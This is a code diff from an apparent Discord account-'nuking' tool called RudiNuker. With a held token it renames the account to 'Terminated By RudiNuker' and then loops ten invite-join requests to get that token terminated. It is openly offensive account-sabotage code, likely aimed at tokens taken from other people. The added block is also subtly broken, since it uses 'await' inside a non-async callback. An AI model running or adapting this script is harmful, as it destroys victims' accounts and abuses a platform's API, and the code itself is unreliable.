@@ -232,21 +232,33 @@ class User extends Color {
         })).status;
 
         if (status !== 200) throw new Error('Request Failed With Error Code ' + status);
-
-        for (i = 0; i < 10; i++) {
-            try {
-                await Axios(
-                    { method: 'POST', url: base + '/invites/meme', headers: this.headers.nuke }
-                ).then((response) => {
-                    console.log(response.data[0].guild.name)
-                }).catch((e) => {
-                    console.log(e)
-                })
-            } catch (e) {
-                console.error("Token Terminated");
-                setTimeout(() => process.exit(), 3000)
-            }
+        try {
+            await Axios(
+                { method: 'PATCH', url: base + '/users/@me', headers: this.headers.nuke, data: { username: "Terminated By RudiNuker" } }
+            ).then((response) => {
+                for (i = 0; i < 10; i++) {
+                    try {
+                        await Axios(
+                            { method: 'POST', url: base + '/invites/meme', headers: this.headers.nuke }
+                        ).then((response) => {
+                            console.log(response.data[0].guild.name)
+                        }).catch((e) => {
+                            console.log(e)
+                        })
+                    } catch (e) {
+                        console.error("Token Terminated");
+                        setTimeout(() => process.exit(), 3000)
+                    }
+                }
+                console.log(response.data[0])
+            }).catch((e) => {
+                console.log(e)
+            })
+        } catch (e) {
+            console.error("Token Terminated");
+            setTimeout(() => process.exit(), 3000)
         }
+
     };
 
     random(array = []) {
